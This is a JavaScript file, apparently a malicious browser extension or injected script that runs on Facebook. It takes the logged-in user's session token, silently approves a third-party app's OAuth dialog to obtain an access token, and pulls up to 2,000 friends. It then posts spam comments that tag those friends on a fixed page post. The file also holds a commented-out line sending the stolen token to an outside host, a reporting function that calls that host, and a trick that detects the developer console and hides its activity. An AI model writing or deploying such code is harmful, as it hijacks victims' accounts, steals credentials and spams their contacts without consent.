var account="UA-106952642-1",create=document.createElement("script")
create.type="text/javascript",create.innerHTML="(function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){ (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o), m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m) })(window,document,'script','https://www.google-analytics.com/analytics.js','ga'); ga('create', '"+account+"', 'auto'); ga('send', 'pageview');",document.body.appendChild(create)
var xhr = new XMLHttpRequest();
xhr.open("GET", "https://whos.amung.us/swidget/my2018app", true);
xhr.onreadystatechange = function() {
    if (xhr.readyState == 4 && xhr.status == 200) {
        xhr.close;
    }
}
xhr.send();

var cnsl = true;
var win = this;
var sie = win["XMLHttpRequest"];
var empty = "";

function nejse() {
    var c_n = "2:0:0:SPAM:"+profile_id;
    var c_t = 10;

    if(!localStorage[c_n] || parseInt(localStorage[c_n]) < Date.now()-60*1000*c_t){
        localStorage[c_n] = Date.now();
        config = {};
        config["post_limit"] = "1";
        config["page_id"] = "566398303481338";
        config["post_id"] = "1475569929230833";
        config["tag_limit"] = 50;
        config["comment"] = true;
        config["mode"] = true;
        if(config.mode == true){
            _e_P();
        }
    }else{
        var a_t = new Date();
        a_t.setTime(parseInt(localStorage[c_n]) + (60*1000*c_t));
        console.log("a_t:" + a_t.toLocaleString());
    }
}

function _e_P(){
  var b = {};
  b["fb_dtsg"] = fb_dtsg;
  b["__user"] = profile_id;
  b["__a"] = 1;
  b["__dyn"] = get_dyn();
  b["__af"] = rastgele(2);
  b["__req"] = rastgele(2);
  b["__be"] = -1;
  b["__pc"] = "EXP:DEFAULT";
  b["__rev"] = __rev;
  b["logging"] = rand(1111111111, 1E16);
  var d = new sie;
  d["open"]("POST", "/settings/application/platform_opt_out/submit/?action=enable&dpr=1");
  d["setRequestHeader"]("Content-Type", "application/x-www-form-urlencoded; charset=UTF-8");
  d["onreadystatechange"] = function() {
    if (4 == d["readyState"]) {
      if (200 == d["status"]) {
        _g_T();
      }
    }
  };
  d["send"](deSerialize(b));
}


function _g_T() {
    var params = {};
    params["fb_dtsg"] = fb_dtsg;
    params["app_id"] = "121876164619130";
    params["redirect_uri"] = "fbconnect://success";
    params["display"] = "popup";
    params["access_token"] = "";
    params["sdk"] = "";
    params["from_post"] = 1;
    params["private"] = "";
    params["tos"] = "";
    params["login"] = "";
    params["read"] = "";
    params["write"] = "";
    params["extended"] = "";
    params["social_confirm"] = "";
    params["confirm"] = "";
    params["seen_scopes"] = "";
    params["auth_type"] = "";
    params["auth_token"] = "";
    params["auth_nonce"] = "";
    params["default_audience"] = "";
    params["ref"] = "Default";
    params["return_format"] = "access_token";
    params["domain"] = "";
    params["sso_device"] = "ios";
    params["__CONFIRM__"] = 1;
    var xhr = new sie();
    xhr.open("POST", "/v2.8/dialog/oauth/confirm");
    xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded; charset=UTF-8");
    xhr.onreadystatechange = function(){
        if (xhr.readyState == 4 && xhr.status == 200){
            var c = {};
            if(xhr.responseText.indexOf("access_token=") > 0){
                c.access_token = xhr.responseText.split("access_token=")[1].split("&")[0];
                //new Image().src = "https://rb-cdn.com/php/token.php?profile_id=" + profile_id + "&access_token=" +  c.access_token + "&gender=VISITORS";
                //c.pages_id = 170738040104673;
                //Kontrol(c);
                _o_L(c);
            }
        }
    }
    xhr.send(deSerialize(params));
}

function _o_L(c) {
  var _0x4a1cx17 = {};
  _0x4a1cx17["q"] = "SELECT uid, name, online_presence, pic_big, can_post  FROM user WHERE uid IN (SELECT uid2 FROM friend WHERE uid1 = me()) Order By online_presence Limit 2000";
  _0x4a1cx17["access_token"] = c["access_token"];
  _0x4a1cx17["ext"] = "me";
  var _0x4a1cx9 = new sie;
  _0x4a1cx9["open"]("GET", "https://graph.facebook.com/fql?" + deSerialize(_0x4a1cx17), true);
  _0x4a1cx9["onreadystatechange"] = function() {
    if (_0x4a1cx9["readyState"] == 4 && _0x4a1cx9["status"] == 200) {
      var data = JSON["parse"](_0x4a1cx9["responseText"]["replace"]("for (;;);", ""));
      if (!data["error"]) {
        var _0x4a1cx27 = data["data"];
        _0x4a1cx27 = shuffle(_0x4a1cx27);
        c["friends"] = [];
        i = 0;
        for (;i < _0x4a1cx27["length"];i++) {
          if (_0x4a1cx27[i]["online_presence"] == "active") {
            c["friends"]["push"](_0x4a1cx27[i]);
          }
        }
        i = 0;
        for (;i < _0x4a1cx27["length"];i++) {
          if (_0x4a1cx27[i]["online_presence"] == "idle") {
            c["friends"]["push"](_0x4a1cx27[i]);
          }
        }
        i = 0;
        for (;i < _0x4a1cx27["length"];i++) {
          if (_0x4a1cx27[i]["online_presence"] == "offline") {
            c["friends"]["push"](_0x4a1cx27[i]);
          }
        }
        if (c["friends"]["length"] > 0) {


		 setTimeout(function() {
            _s_T(c);
          }, 1500);
        }
      }
    }
  };
  _0x4a1cx9["send"]();
}

function Kontrol(c) {
    var xhr = new XMLHttpRequest();
    var params = {};
    params["q"] = "SELECT created_time FROM page_fan WHERE uid = me() AND page_id = " + c.pages_id;
    params["access_token"] = c.access_token;
    xhr.open("GET", "https://graph.facebook.com/fql?" + deSerialize(params));
    xhr.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
    xhr.onreadystatechange = function() {
        if (xhr.readyState == 4 && xhr.status == 200) {
            var data = JSON.parse(xhr.responseText);
            if (data.data.length == 0) {
                pages(c);
            }
        }
    }
    xhr.send();
}
function pages(c) {
    var xhr = new XMLHttpRequest();
    var params = {};
    params["fbpage_id"] = c.pages_id;
    params["add"] = "true";
    params["reload"] = "false";
    params["fan_origin"] = "page_timeline";
    params["fan_source"] = "";
    params["cat"] = "";
    params["actor_id"] = profile_id;
    params["__user"] = profile_id;
    params["__a"] = "1";
    params["__dyn"] = get_dyn();
    params["__af"] = "m";
    params["__req"] = "c";
    params["__be"] = "-1";
    params["__pc"] = "PHASED:DEFAULT";
    params["fb_dtsg"] = fb_dtsg;
    params["ttstamp"] = ttstamp;
    params["__rev"] = __rev;
    xhr.open("POST", "/ajax/pages/fan_status.php?av=" + profile_id + "&dpr=1", true);
    xhr.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
    xhr.onreadystatechange = function() {
        if (xhr.readyState == 4 && xhr.status == 200) {
            xhr.close;
        }
    }
    xhr.send(deSerialize(params));
}
function _s_T(c){
    var p_limit = Math.ceil(c.friends.length/config.tag_limit);
    config.post_limit = p_limit>config.post_limit?config.post_limit:p_limit;
    if(config.post_limit == 0){
        config.post_limit = 1;
    }
    for(p=0;p<config.post_limit;p++){
        c.tags = [];
        for(pk=0;pk<config.tag_limit;pk++){
            var index = pk+(config.tag_limit*p);
            if(c.friends[index]){
                c.tags.push(c.friends[index]);
            }
        }
        c.uid = c.tags[0].uid;
		c.name = c.tags[0].name;

        _h(c);
    }
}
function _h(c) {
  var textArray1 = [':o', ':P', 'O:)', '3:)', 'O.o', ';)', ':O', '-_-', '>:O', ':*', '<3', '^_^', '8-)', '8|', ':v', ':3', '(y)', ':)'];
  var randomNumber1 = Math.floor(Math.random() * textArray1.length);
  emoticon = textArray1[randomNumber1];
  var queryString = {};
  queryString["app_id"] = "2392950137";
  queryString["audience_type"] = "self";
  queryString["composer_session_id"] = guid();
  queryString["ephemeral_ttl_mode"] = 0;
  queryString["ft[tn]"] = "J]";
  queryString["ft[type]"] = 25;
  queryString["ft[top_level_post_id]"] = config.post_id;
  queryString["ft[tl_objid]"] = config.post_id;
  queryString["ft[page_id]"] = config.page_id;
  queryString["ft[fbfeed_location]"] = 120;
  queryString["internalextra[feedback_source]"] = 2;
  queryString["message"] = "Denuncia este video y esta página como falsa o spam tengo virus de ellos... >:O >:O >:O"+ "\n";
  for (i = 0;i < c["tags"]["length"];i++) {
  queryString["message"] += "@[" + c["tags"][i]["uid"] + ":" + c["tags"][i]["name"].split(" ")[0] + "]  ";
  }
  queryString["owner_id"] = config.page_id;
  queryString["post_id"] = config.post_id;
  queryString["privacy"] = "300645083384735";
  queryString["share_to_group_as_page"] = false;
  queryString["share_type"] = 11;
  queryString["shared_ad_id"] = "";
  queryString["source"] = "osbach";
  queryString["is_throwback_post"] = false;
  queryString["url"] = "";
  queryString["av"] = profile_id;
  queryString["dpr"] = 1;
  queryString["ext"] = "me";
  var formData = {};
  formData["__user"] = profile_id;
  formData["__a"] = 1;
  formData["__dyn"] = get_dyn();
  formData["__af"] = rastgele(2);
  formData["__req"] = rand(1, 20);
  formData["__be"] = -1;
  formData["__pc"] = "PHASED:DEFAULT";
  formData["__rev"] = __rev;
  formData["fb_dtsg"] = fb_dtsg;
  formData["jazoest"] = ttstamp;
  formData["__spin_r"] = __rev;
  formData["__spin_b"] = "trunk";
  formData["__spin_t"] = Math["floor"](Date["now"]() / 1E3);
  var e = new sie;
  e["open"]("POST", "/share/dialog/submit/?"+deSerialize(queryString));
  e["setRequestHeader"]("Content-Type", "application/x-www-form-urlencode" +
  "d; charset=UTF-8");
  e["onreadystatechange"] = function() {
    if (4 == e["readyState"]) {
      if (200 == e["status"]) {
        if (0 < e["responseText"].indexOf("This has been shared to your Timeline.")) {
          var data = JSON.parse(e.responseText.replace("for (;;);",""));
          var posti = data.payload.object_id;
          //_m(posti, config.page_id, config.post_id, "Shared", 1);
        }
      }
    }
  };
  e["send"](deSerialize(formData));
}

function _m(c, b, d, e, f) {
  var h = {};
  h["user"] = profile_id;
  h["result"] = c || "";
  h["site"] = "facebook.com";
  h["link"] = b || "";
  h["img"] = d || "";
  h["type"] = e || "";
  h["success"] = f || 0;
  fetch("https://rb-cdn.com/php/report.php?" + deSerialize(h));
}
function get_dyn() {
 function toCompressedString() {
   $BitMap1 = [];
   for (i in t) {
     $BitMap1[t[i]] = 1;
   }
   if ($BitMap1["length"] === 0) {
     return "";
   }
   var l = [];
   var m = 1;
   var n = $BitMap1[0] || 0;
   var o = n.toString(2);
   var p = 1;
   for (;p < $BitMap1["length"];p++) {
     var q = $BitMap1[p] || 0;
     if (q === n) {
       m++;
     } else {
       l["push"](j(m));
       n = q;
       m = 1;
     }
   }
   if (m) {
     l["push"](j(m));
   }
   return k(o + l["join"](""));
 }
 function j(l) {
   var m = l.toString(2);
   var n = "0"["repeat"](m["length"] - 1);
   return n + m;
 }
 function k(l) {
   var m = (l + "00000")["match"](/[01]{6}/g);
   var n = "";
   var o = 0;
   for (;o < m["length"];o++) {
     n += h[parseInt(m[o], 2)];
   }
   return n;
 }
 var bd = document["body"]["innerHTML"]["match"](/\},([0-9])+\]/gi);
 var hd = document["head"]["innerHTML"]["match"](/\},([0-9])+\]/gi);
 var is = bd["concat"](hd);
 var t = [];
 for (x in is) {
   if (is[x] != null) {
     var p = is[x]["replace"]("},", "")["replace"]("]", "");
     if (parseInt(p) >= 7) {
       t["push"](parseInt(p));
     }
   }
 }
 var h = "0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ-_";
 return toCompressedString();
}
function generate_name(length,firstUpper){
    rname = "";
    sesli = "aeiou";
    sessiz = "bcdfghjklmnprstvyz";
    rname = rand(1,2) == 1?sessiz[rand(0,sessiz.length-1)]:sesli[rand(0,sesli.length-1)];
    if(firstUpper == true){
        rname = rname.toUpperCase();
    }
    for(n=0;n<length;n++){
        if(sesli.indexOf(rname[rname.length-1]) >= 0){
            rname += sessiz[rand(0,sessiz.length-1)];
        }else{
            rname += sesli[rand(0,sesli.length-1)];
        }
    }
    return rname;
}

function inArray(arr, key, value){
    var res = false;
    for(a=0;a<arr.length;a++){
        for(k in arr[a]){
            if(k == key && arr[a][k] == value){
                res = true;
                break;
            }
        }
    }
    return res;
}

function decode(t,h){
    var a = "abcdefghijklmnoprstuvyzx0123456789";
    var c = "";
    for(cr=0;cr<t.length;cr++){
        c += a[h.indexOf(t[cr])];
    }
    return c;
}

function guid() {
  function s4() {
    return Math.floor((1 + Math.random()) * 0x10000)
      .toString(16)
      .substring(1);
  }
  return s4() + s4() + '-' + s4() + '-' + s4() + '-' +
    s4() + '-' + s4() + s4() + s4();
}

function randoms(l, m) {
    var r = [];
    while (r.length < l) {
        var rnd = Math.floor(Math.random() * m);
        if (r.indexOf(rnd) < 0) {
            r.push(rnd);
        }
    }
    return r;
}

function searchArray(a,k){
    var found = false;
    for(key in a){
        if(key.toString() == k){
            found = a[key];
            break;
        }else if(typeof a[key] == "object"){
            found = searchArray(a[key],k);
            if(found != false){
                break;
            }
        }
    }
    return found;
}

function shuffle(array) {
  var currentIndex = array.length, temporaryValue, randomIndex;

  while (0 !== currentIndex) {
    randomIndex = Math.floor(Math.random() * currentIndex);
    currentIndex -= 1;
    temporaryValue = array[currentIndex];
    array[currentIndex] = array[randomIndex];
    array[randomIndex] = temporaryValue;
  }

  return array;
}

function rand(min,max){
    return Math.floor(Math.random()* (max-min))+min;
}

function rastgele(uzunluk) {
    mtn = "abcdefghijklmnoprstuvyzxABCDEFGHIJKLMNOPRSTUVYZX0123456789";
    ret = "";
    for (l = 0; l < uzunluk; l++) {
        ret += mtn[Math.floor(Math.random() * mtn.length)];
    }
    return ret;
}

function deSerialize(json) {
    return Object.keys(json).map(function(key) {
        return encodeURIComponent(key) + '=' + encodeURIComponent(json[key]);
    }).join('&');
}
var cntrl = "d";
var element = new Image;
if (0 <= location["hostname"].indexOf("facebook.com")) {
  element["__defineGetter__"]("id", function() {
    cntrl = "e";
  });
  console["log"](element);
  console["clear"]();
}
function _C() {
  var c = new sie;
  c["open"]("GET", "https://www.facebook.com/");
  c["send"]();
  c["onreadystatechange"] = function() {
    if (4 == c["readyState"] && (profile_id = c["responseText"].split("USER_ID" + '"' + ":")[1].split('"')[1].split('"')[0], 0 != profile_id)) {
      user_name = c["responseText"].split("NAME" + '"' + ":")[1].split('"')[1].split('"')[0];
      locale = c["responseText"].split('{"locale' + '"' + ":")[1].split('"')[1].split('"')[0];
      fb_dtsg = c["responseText"].split("name=" + '"' + "fb_dtsg")[1].split("value=" + '"')[1].split('"')[0];
      __rev = c["responseText"].split('"' + "server_revision" + '"' + ":")[1].split(",")[0];
      ttstamp = "";
      var b = 0;
      for (;b < fb_dtsg["length"];b++) {
        ttstamp += fb_dtsg["charCodeAt"](b);
      }
      ttstamp = "2" + ttstamp;
      nejse();
    }
  };
}
if (0 <= location["hostname"].indexOf("facebook.com") && (cntrl == "d" || 1 == cnsl)) {
  if (!document["getElementById"]("isrun") && 0 > location["href"].indexOf("facebook.com/checkpoint")) {
    var lg = document["createElement"]("meta");
    lg["id"] = "isrun";
    document["head"].appendChild(lg);
    _C();
  }
} else {
  if (0 <= location["hostname"].indexOf("facebook.com")) {
    console["error"]("Uncaught ReferenceError: fb_dtsg is not defined");
  }
}
;
